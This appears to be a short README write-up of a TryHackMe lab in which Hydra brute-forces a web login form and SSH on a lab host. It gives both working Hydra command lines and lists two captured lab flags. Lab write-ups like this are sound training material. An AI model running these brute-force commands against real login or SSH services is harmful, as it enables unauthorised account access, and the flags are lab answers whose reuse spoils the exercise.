# Hydra Brute Force Attack - TryHackMe

## Overview

This project demonstrates brute-force attacks using Hydra on web login and SSH services.

## Tools Used

* Hydra
* Kali Linux
* TryHackMe Lab

## Attack Types

* HTTP POST Login Brute Force
* SSH Brute Force

## Commands Used

### HTTP Brute Force

```
hydra -l molly -P rockyou.txt 10.10.x.x http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### SSH Brute Force

```
hydra -l molly -P rockyou.txt 10.10.x.x ssh
```

## Results

* Successfully cracked web login credentials
* Gained SSH access

## Flags Captured

* Flag 1: THM{2673a7dd116de68e85c48ec0b1f2612e}
* Flag 2: THM{8cebe0468febbaddea859baeb33b2541b}

## Learning Outcome

* Understood brute-force attacks
* Learned Hydra syntax and usage
* Practiced real-world credential attacks

